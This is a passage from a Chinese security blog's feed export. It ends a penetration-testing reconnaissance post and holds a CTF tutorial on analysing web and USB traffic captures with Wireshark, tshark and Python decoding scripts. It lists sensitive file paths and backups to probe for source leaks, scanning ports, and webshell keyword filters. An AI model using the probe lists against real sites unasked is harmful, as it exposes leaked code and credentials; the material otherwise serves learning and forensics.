class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">robots.txt</span><br><span class="line">crossdomin.xml</span><br><span class="line">sitemap.xml</span><br><span class="line">/WEB-INF/</span><br><span class="line">svn</span><br><span class="line">SVN</span><br><span class="line">.svn</span><br><span class="line">.svn</span><br><span class="line">entries</span><br><span class="line">源码泄漏文件</span><br><span class="line">#根据系统类型，寻找对应的漏洞，下面是tomcat的session泄露</span><br><span class="line">/examples/servlets/servlet/SessionExample/examples/</span><br><span class="line">/WEB-INF/config/jdbc.properties/WEB-INF/web.xml/WEB-INF/classes/</span><br><span class="line">WEB-INF/web.xml :Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">WEB-INF/database.properties :数据库配置文件</span><br><span class="line">WEB-INF/classes/ :一般用来存放Java类文件(.class)</span><br><span class="line">WEB-INF/lib/ :用来存放打包好的库(.jar)</span><br><span class="line">WEB-INF/src/ :用来放源代码(.asp和.php等)</span><br><span class="line">.bzr</span><br><span class="line">.DS_store</span><br><span class="line">.hg</span><br><span class="line">.swp</span><br><span class="line">.bak</span><br><span class="line">backup.tgz</span><br><span class="line">http://example.com/static../</span><br><span class="line">www.zip</span><br><span class="line">http://www.zip</span><br><span class="line">www.tar.gz</span><br><span class="line">http://www.tar.gz</span><br><span class="line">www.rar</span><br><span class="line">http://www.rar</span><br><span class="line">web.zip</span><br><span class="line">web.rar</span><br></pre></td></tr></table></figure></li></ol><h3 id="脆弱系统-网络空间"><a href="#脆弱系统-网络空间" class="headerlink" title="脆弱系统(网络空间)"></a>脆弱系统(网络空间)</h3><p>网络空间搜索引擎</p><ul><li><p>Shodan</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.shodan.io/search?query=http.title:</span><br><span class="line">http://www.shodan.io/search?query=http.title:&quot;百度&quot; country:&quot;CN&quot;</span><br></pre></td></tr></table></figure></li><li><p>Censys</p></li><li>zoomeye</li><li>fofa</li></ul><h3 id="旁站"><a href="#旁站" class="headerlink" title="旁站"></a>旁站</h3><p>旁站是和目标网站在同一台服务器上的其它的网站。</p><ul><li><p>在线工具</p><ul><li><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a></li><li>站长之家</li></ul></li><li><p>k8旁站查询</p></li></ul><h3 id="c段"><a href="#c段" class="headerlink" title="c段"></a>c段</h3><p>C端是和目标服务器ip处在同一个C段的其它服务器。</p><p><strong>查询方式</strong></p><ul><li><p>IIS PUT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">135,139,80,8080,15672,873,8983,7001,4848,6379,2381,8161,11211,5335,5336,7809,2181,9200,50070,50075,5984,2375,7809,16992,16993#自定义端口</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>北极熊扫描器 </p><p>这是一款国人写的扫描器，不得不说这款扫描器误报率是真的高。通过一些实战我发现这款扫描器不错的是C端扫描，可以获取网站标题、服务环境、程序类型</p></li><li><p>Nmap</p></li></ul><h2 id="4-企业信息"><a href="#4-企业信息" class="headerlink" title="4. 企业信息"></a>4. 企业信息</h2><h3 id="天眼查"><a href="#天眼查" class="headerlink" title="天眼查"></a><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">天眼查</a></h3><p>天眼查是一款“都能用的商业安全工具”，根据用户的不同需求，实现了企业背景、企业发展、司法风险、经营风险、经营状况、知识产权方面等多种数据维度的检索。</p><h3 id="企业信用信息公示系统"><a href="#企业信用信息公示系统" class="headerlink" title="企业信用信息公示系统"></a><a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener">企业信用信息公示系统</a></h3><p><strong>参考文章</strong>：</p><p><a href="https://bbs.ichunqiu.com/thread-27820-1-1.html" target="_blank" rel="noopener">漫谈前期信息收集</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651072880&amp;idx=1&amp;sn=f09292313658c92db3e481a2f24db988&amp;chksm=bd1fbbfb8a6832eda1b31ca572a50ec9ec8978713c7d4068bd5de1f5008ad29e3f049cdf6341&amp;mpshare=1&amp;scene=23&amp;srcid=##" target="_blank" rel="noopener">我的信息搜集之道</a></p><p><a href="https://www.4hou.com/technology/8535.html" target="_blank" rel="noopener">渗透测试工程师子域名收集指南</a></p><p><a href="https://gorgias.me/2017/12/05/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">子域名收集笔记</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF流量分析</title>
      <link href="/2019/06/16/CTF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2019/06/16/CTF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="一、流量包修复"><a href="#一、流量包修复" class="headerlink" title="一、流量包修复"></a>一、流量包修复</h2><p>通过在线pacp包修复工具进行修复：</p><p><a href="http://f00l.de/hacking/pcapfix.php" target="_blank" rel="noopener">http://f00l.de/hacking/pcapfix.php</a></p><h2 id="二、WEB流量包分析"><a href="#二、WEB流量包分析" class="headerlink" title="二、WEB流量包分析"></a>二、WEB流量包分析</h2><p>WEB数据包分析主要包含WEB攻击行为的分析， 典型的WEB攻击行为有：WEB扫描、后台目录爆破、后台账号爆破、WEBSHELL上传、SQL注入等等。</p><h3 id="1-WEB扫描分析"><a href="#1-WEB扫描分析" class="headerlink" title="1. WEB扫描分析"></a>1. WEB扫描分析</h3><p>常见的WEB扫描器有Awvs，Netsparker，Appscan，Webinspect，Rsas（绿盟极光），Nessus，WebReaver，Sqlmap等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;扫描器特征值&quot;</span><br></pre></td></tr></table></figure><p>常见的扫描器特征参考：<a href="https://www.freebuf.com/column/156291.htm" target="_blank" rel="noopener">https://www.freebuf.com/column/156291.htm</a> </p><h3 id="2-后台目录爆破分析"><a href="#2-后台目录爆破分析" class="headerlink" title="2. 后台目录爆破分析"></a>2. 后台目录爆破分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;后台url特征&quot;</span><br></pre></td></tr></table></figure><h3 id="3-后台账号爆破"><a href="#3-后台账号爆破" class="headerlink" title="3. 后台账号爆破"></a>3. 后台账号爆破</h3><p>WEB账号登陆页面通常采用post方法请求，要获取流量包中记录的账号信息可通过wireshark筛选出POST请求和账号中的关键字如‘admin’。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http contains &quot;关键字&quot;</span><br></pre></td></tr></table></figure><h3 id="4-WEBSHELL上传"><a href="#4-WEBSHELL上传" class="headerlink" title="4. WEBSHELL上传"></a>4. WEBSHELL上传</h3><p>Webshell文件上传常采用post方法请求，文件内容常见关键字eval，system，assert。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http contains &quot;关键字&quot;</span><br><span class="line">http contains &quot;base64_decode&quot;#菜刀特征</span><br></pre></td></tr></table></figure><h3 id="5-数据库密码"><a href="#5-数据库密码" class="headerlink" title="5. 数据库密码"></a>5. 数据库密码</h3><p>一般是读config文件查看数据库密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;&lt;?php&quot;</span><br></pre></td></tr></table></figure><h3 id="6-数据库中内容"><a href="#6-数据库中内容" class="headerlink" title="6. 数据库中内容"></a>6. 数据库中内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql contains &quot;关键字&quot;</span><br></pre></td></tr></table></figure><h3 id="7-vpn及其ip"><a href="#7-vpn及其ip" class="headerlink" title="7. vpn及其ip"></a>7. vpn及其ip</h3><p>查看TCP流量最多的IP</p><h2 id="三、USB流量包分析"><a href="#三、USB流量包分析" class="headerlink" title="三、USB流量包分析"></a>三、USB流量包分析</h2><p>USB流量指的是USB设备接口的流量，攻击者能够通过监听usb接口流量获取键盘敲击键、鼠标移动与点击、存储设备的铭文传输通信、USB无线网卡网络传输内容等等。</p><h3 id="1-键盘流量"><a href="#1-键盘流量" class="headerlink" title="1. 键盘流量"></a>1. 键盘流量</h3><p>USB协议数据部分在Leftover Capture Data域中，数据长度为八个字节。其中键盘击键信息集中在第三个字节中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usb.capdata</span><br></pre></td></tr></table></figure><ol><li><p>使用kali linux中的<code>tshark</code> 命令把<code>cap data</code>提取出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure></li><li><p>去除空行</p><p>word里替换 <code>^p^p</code> 为 <code>^p</code>，但是这样显得很不专业，下面是更优雅一点的做法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;/^$/d&quot; usbdata.txt</span><br></pre></td></tr></table></figure></li><li><p>根据<a href="https://wenku.baidu.com/view/9050c3c3af45b307e971971e.html" target="_blank" rel="noopener">《USB键盘协议中键码》</a>中的HID Usage ID将数据还原成键位。</p><p>这里贴下漏斗社区上的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">"A"</span>,  <span class="number">0x05</span>:<span class="string">"B"</span>,  <span class="number">0x06</span>:<span class="string">"C"</span>, <span class="number">0x07</span>:<span class="string">"D"</span>, <span class="number">0x08</span>:<span class="string">"E"</span>, <span class="number">0x09</span>:<span class="string">"F"</span>, <span class="number">0x0A</span>:<span class="string">"G"</span>,  <span class="number">0x0B</span>:<span class="string">"H"</span>, <span class="number">0x0C</span>:<span class="string">"I"</span>,  <span class="number">0x0D</span>:<span class="string">"J"</span>, <span class="number">0x0E</span>:<span class="string">"K"</span>, <span class="number">0x0F</span>:<span class="string">"L"</span>, <span class="number">0x10</span>:<span class="string">"M"</span>, <span class="number">0x11</span>:<span class="string">"N"</span>,<span class="number">0x12</span>:<span class="string">"O"</span>,  <span class="number">0x13</span>:<span class="string">"P"</span>, <span class="number">0x14</span>:<span class="string">"Q"</span>, <span class="number">0x15</span>:<span class="string">"R"</span>, <span class="number">0x16</span>:<span class="string">"S"</span>, <span class="number">0x17</span>:<span class="string">"T"</span>, <span class="number">0x18</span>:<span class="string">"U"</span>,<span class="number">0x19</span>:<span class="string">"V"</span>, <span class="number">0x1A</span>:<span class="string">"W"</span>, <span class="number">0x1B</span>:<span class="string">"X"</span>, <span class="number">0x1C</span>:<span class="string">"Y"</span>, <span class="number">0x1D</span>:<span class="string">"Z"</span>, <span class="number">0x1E</span>:<span class="string">"1"</span>, <span class="number">0x1F</span>:<span class="string">"2"</span>, <span class="number">0x20</span>:<span class="string">"3"</span>, <span class="number">0x21</span>:<span class="string">"4"</span>, <span class="number">0x22</span>:<span class="string">"5"</span>,  <span class="number">0x23</span>:<span class="string">"6"</span>, <span class="number">0x24</span>:<span class="string">"7"</span>, <span class="number">0x25</span>:<span class="string">"8"</span>, <span class="number">0x26</span>:<span class="string">"9"</span>, <span class="number">0x27</span>:<span class="string">"0"</span>, <span class="number">0x28</span>:<span class="string">"\n"</span>, <span class="number">0x2a</span>:<span class="string">"[DEL]"</span>,  <span class="number">0X2B</span>:<span class="string">"    "</span>, <span class="number">0x2C</span>:<span class="string">" "</span>,  <span class="number">0x2D</span>:<span class="string">"-"</span>, <span class="number">0x2E</span>:<span class="string">"="</span>, <span class="number">0x2F</span>:<span class="string">"["</span>,  <span class="number">0x30</span>:<span class="string">"]"</span>,  <span class="number">0x31</span>:<span class="string">"\\"</span>, <span class="number">0x32</span>:<span class="string">"~"</span>, <span class="number">0x33</span>:<span class="string">";"</span>,  <span class="number">0x34</span>:<span class="string">"'"</span>, <span class="number">0x36</span>:<span class="string">","</span>,  <span class="number">0x37</span>:<span class="string">"."</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">'0'</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">'[unknown]'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'output :\n'</span> + output</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 .\keyboard.py</span><br></pre></td></tr></table></figure></li></ol><h3 id="2-鼠标流量"><a href="#2-鼠标流量" class="headerlink" title="2. 鼠标流量"></a>2. 鼠标流量</h3><p>USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为四个字节。</p><p>其中第一个字节代表按键，当取0×00时，代表没有按键、为0×01时，代表按左键，为0×02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。</p><ol><li><p>使用kali linux中的<code>tshark</code> 命令把<code>cap data</code>提取出来，并去除空行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt &amp;&amp; sed -i &quot;/^$/d&quot; usbdata.txt</span><br></pre></td></tr></table></figure></li><li><p>根据usb协议鼠标数据还原鼠标移动轨迹。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python mouse.py &gt; &apos;xy.txt&apos;</span><br><span class="line">gnuplot</span><br><span class="line">plot &quot;xy.txt&quot;</span><br></pre></td></tr></table></figure><p>或者另一个脚本直接运行出结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python UsbMiceDataHacker.py usb2.pcap RIGHT</span><br></pre></td></tr></table></figure><p>mouse.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">nums = [] </span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>,<span class="string">'r'</span>) </span><br><span class="line">posx = <span class="number">0</span> </span><br><span class="line">posy = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys: </span><br><span class="line"><span class="keyword">if</span> len(line) != <span class="number">12</span> : </span><br><span class="line"><span class="keyword">continue</span> </span><br><span class="line">x = int(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>) </span><br><span class="line">y = int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>) </span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">127</span> : </span><br><span class="line">x -= <span class="number">256</span> </span><br><span class="line"><span class="keyword">if</span> y &gt; <span class="number">127</span> : </span><br><span class="line">y -= <span class="number">256</span> </span><br><span class="line">posx += x </span><br><span class="line">posy += y </span><br><span class="line">btn_flag = int(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing </span></span><br><span class="line"><span class="keyword">if</span> btn_flag == <span class="number">1</span> : </span><br><span class="line"><span class="keyword">print</span> posx,posy </span><br><span class="line">keys.close()</span><br></pre></td></tr></table></figure><p>UsbMiceDataHacker.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">mousePositionX = <span class="number">0</span></span><br><span class="line">mousePositionY = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">X = []</span><br><span class="line">Y = []</span><br><span class="line"></span><br><span class="line">DataFileName = <span class="string">"usb.dat"</span></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> mousePositionX</span><br><span class="line">    <span class="keyword">global</span> mousePositionY</span><br><span class="line">    <span class="comment"># check argv</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage : "</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        python UsbMiceHacker.py data.pcap [LEFT|RIGHT|MOVE|ALL]"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Tips : "</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        To use this python script , you must install the numpy,matplotlib first."</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        You can use `sudo pip install matplotlib numpy` to install it"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Author : "</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        WangYihang &lt;wangyihanger@gmail.com&gt;"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        If you have any questions , please contact me by email."</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        Thank you for using."</span></span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get argv</span></span><br><span class="line">    pcapFilePath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    action = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> action != <span class="string">"LEFT"</span> <span class="keyword">and</span> action != <span class="string">"ALL"</span> <span class="keyword">and</span> action != <span class="string">"RIGHT"</span> <span class="keyword">and</span> action != <span class="string">"MOVE"</span>:</span><br><span class="line">        action = <span class="string">"LEFT"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get data of pcap</span></span><br><span class="line">    command = <span class="string">"tshark -r '%s' -T fields -e usb.capdata &gt; %s"</span> % (</span><br><span class="line">        pcapFilePath, DataFileName)</span><br><span class="line">    <span class="keyword">print</span> command</span><br><span class="line">    os.system(command)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># read data</span></span><br><span class="line">    <span class="keyword">with</span> open(DataFileName, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            data.append(line[<span class="number">0</span>:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># handle move</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        Bytes = i.split(<span class="string">":"</span>)</span><br><span class="line">        <span class="keyword">if</span> len(Bytes) == <span class="number">8</span>:</span><br><span class="line">            horizontal = <span class="number">2</span>  <span class="comment"># -</span></span><br><span class="line">            vertical = <span class="number">4</span>  <span class="comment"># |</span></span><br><span class="line">        <span class="keyword">elif</span> len(Bytes) == <span class="number">4</span>:</span><br><span class="line">            horizontal = <span class="number">1</span>  <span class="comment"># -</span></span><br><span class="line">            vertical = <span class="number">2</span>  <span class="comment"># |</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        offsetX = int(Bytes[horizontal], <span class="number">16</span>)</span><br><span class="line">        offsetY = int(Bytes[vertical], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> offsetX &gt; <span class="number">127</span>:</span><br><span class="line">            offsetX -= <span class="number">256</span></span><br><span class="line">        <span class="keyword">if</span> offsetY &gt; <span class="number">127</span>:</span><br><span class="line">            offsetY -= <span class="number">256</span></span><br><span class="line">        mousePositionX += offsetX</span><br><span class="line">        mousePositionY += offsetY</span><br><span class="line">        <span class="keyword">if</span> Bytes[<span class="number">0</span>] == <span class="string">"01"</span>:</span><br><span class="line">            <span class="comment"># print "[+] Left butten."</span></span><br><span class="line">            <span class="keyword">if</span> action == <span class="string">"LEFT"</span>:</span><br><span class="line">                <span class="comment"># draw point to the image panel</span></span><br><span class="line">                X.append(mousePositionX)</span><br><span class="line">                Y.append(-mousePositionY)</span><br><span class="line">        <span class="keyword">elif</span> Bytes[<span class="number">0</span>] == <span class="string">"02"</span>:</span><br><span class="line">            <span class="comment"># print "[+] Right Butten."</span></span><br><span class="line">            <span class="keyword">if</span> action == <span class="string">"RIGHT"</span>:</span><br><span class="line">                <span class="comment"># draw point to the image panel</span></span><br><span class="line">                X.append(mousePositionX)</span><br><span class="line">                Y.append(-mousePositionY)</span><br><span class="line">        <span class="keyword">elif</span> Bytes[<span class="number">0</span>] == <span class="string">"00"</span>:</span><br><span class="line">            <span class="comment"># print "[+] Move."</span></span><br><span class="line">            <span class="keyword">if</span> action == <span class="string">"MOVE"</span>:</span><br><span class="line">                <span class="comment"># draw point to the image panel</span></span><br><span class="line">                X.append(mousePositionX)</span><br><span class="line">                Y.append(-mousePositionY)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print "[-] Known operate."</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">"ALL"</span>:</span><br><span class="line">            <span class="comment"># draw point to the image panel</span></span><br><span class="line">            X.append(mousePositionX)</span><br><span class="line">            Y.append(-mousePositionY)</span><br><span class="line"></span><br><span class="line">    fig = plt.figure()</span><br><span class="line">    ax1 = fig.add_subplot(<span class="number">111</span>)</span><br><span class="line"></span><br><span class="line">    ax1.set_title(<span class="string">'[%s]-[%s] Author : WangYihang'</span> % (pcapFilePath, action))</span><br><span class="line">    ax1.scatter(X, Y, c=<span class="string">'r'</span>, marker=<span class="string">'o'</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># clean temp data</span></span><br><span class="line">    os.system(<span class="string">"rm ./%s"</span> % (DataFileName))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li></ol><p>参考：</p><p>《CTF流量分析之题型深度解析》，<a href="https://www.freebuf.com/column/201830.html" target="_blank" rel="noopener">https://www.freebuf.com/column/201830.html</a></p><p>《记一道USB流量分析CTF题》，<a href="https://blog.csdn.net/qq_36609913/article/details/78578406" target="_blank" rel="noopener">https://blog.csdn.net/qq_36609913/article/details/78578406</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wireshark入门分析</title>
      <link href="/2019/06/15/Wireshark%E5%85%A5%E9%97%A8%E5%88%86%E6%9E%90/"/>
      <url>/2019/06/15/Wireshark%E5%85%A5%E9%97%A8%E5%88%86%E6%9E%90/</url>
      
